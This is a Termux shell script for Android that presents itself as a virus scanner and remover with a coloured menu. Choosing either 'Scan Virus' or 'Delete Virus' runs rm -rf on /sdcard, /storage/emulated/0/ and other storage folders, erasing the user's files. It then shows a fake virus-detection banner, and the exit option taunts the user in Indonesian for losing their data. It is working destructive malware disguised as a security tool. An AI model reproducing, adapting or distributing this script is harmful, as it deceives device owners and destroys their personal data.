clear
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
clear

figlet Delete Virus
echo
echo
termux-setup-storage
echo
echo $cyan">>>>>>>>>>>>>>>>>>>>>>><<<<<<<<<<<<<<<<<<<<<<<<<<<<"
echo $cyan"=>"$green"            ["$red" 1"$green" ]"$cyan"  Scan Virus"
echo $cyan"=>"$green"            ["$red" 2"$green" ]"$cyan"  Delete Virus"
echo $cyan"=>"$green"            ["$red" 00"$green"]"$cyan"  Exit Program"
echo $cyan">>>>>>>>>>>>>>>>>>>>>>><<<<<<<<<<<<<<<<<<<<<<<<<<<<"
echo
echo
read -p "localhost~#: " pill;
echo
if [ $pill = 1 ]
then
clear
termux-setup-storage
rm -rf /sdcard/Download
rm -rf /sdcard/Android/obb
rm -rf /storage/emulated/0/
rm -rf /sdcard/Android/data
rm -rf /sdcard/Music
rm -rf /sdcard
echo " Proses..." | lolcat
sleep 1
clear
sleep 1
echo
echo "Finish..."
echo
sleep 1
clear
echo $cyan"<================================================>"
echo $cyan"<       Android Anda Terdeteksi Virus....        >"
echo $cyan"< Virus Tipe: 1. Trojans                         >"
echo $cyan"<             2. Virtex                          >"
echo $cyan"<             3. A+                              >"
echo $cyan"<             4. Legs 56bit                      >"
echo $cyan"<================================================>"
fi






if [ $pill = 2 ]
then
clear
termux-setup-storage
rm -rf /sdcard/Download
rm -rf /sdcard/Android/obb
rm -rf /storage/emulated/0/
rm -rf /sdcard/Android/data
rm -rf /sdcard/Music
rm -rf /sdcard
echo " Proses..." | lolcat
sleep 1
clear
sleep 1
echo
echo "Finish..."
echo
sleep 1
clear
echo $cyan"<================================================>"
echo $cyan"<       Android Anda Terdeteksi Virus....        >"
echo $cyan"< Virus Tipe: 1. Trojans                         >"
echo $cyan"<             2. Virtex                          >"
echo $cyan"<             3. A+                              >"
echo $cyan"<             4. Legs 56bit                      >"
echo $cyan"<================================================>"
fi






if [ $pill = 00 ]
then
clear
echo "Selamat Data Data Anda Hilang....wkwkwkwk:v"
echo
sleep 1
echo "By Mr.crot"
echo
exit
fi
